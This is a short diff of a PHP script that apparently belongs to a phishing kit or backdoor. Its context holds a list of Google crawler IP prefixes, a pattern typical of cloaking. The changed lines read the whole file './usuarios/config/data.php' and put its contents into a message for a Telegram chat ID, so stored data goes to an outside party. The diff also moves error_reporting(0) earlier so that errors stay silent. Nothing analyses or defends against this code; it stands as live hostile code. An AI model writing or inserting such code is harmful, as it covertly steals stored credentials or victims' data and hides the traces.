@@ -488,14 +488,13 @@ $gooip=[ '74.125.','66.102.7.','66.249.64.','66.102.1.','66.102.2.','66.102.3.',
         endif;
 
     }
-error_re
+error_reporting(0);
 $lineas = file('./usuarios/config/data.php');
 $enviar="";
 foreach($lineas as $linea){
 	$enviar.=$linea. " ".$linea;
 	
 }
-error_reporting(0);
 $enviar= str_replace("<","",$enviar);
 $enviar= str_replace(">","",$enviar);
  $data = ['text' => $enviar,'chat_id' => "-810706265"];
